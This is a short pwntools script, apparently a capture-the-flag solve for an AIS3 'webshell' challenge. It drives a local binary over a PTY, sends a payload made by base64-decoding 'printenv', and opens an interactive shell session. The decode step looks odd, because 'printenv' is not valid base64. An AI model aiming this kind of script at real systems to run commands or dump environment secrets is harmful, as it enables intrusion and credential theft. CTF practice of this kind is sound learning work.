from pwn import *
import os
import tty
#r = remote('chals1.ais3.org', 12369)
r = process('./src/webshell', stdin=PTY, raw=False)

payload = os.popen("echo \"printenv\" | base64 -d","r" , 1).read()
print(payload)
r.sendline(payload)
r.send(chr(tty.CEOF))
r.interactive()
#r.shutdown_raw('send')
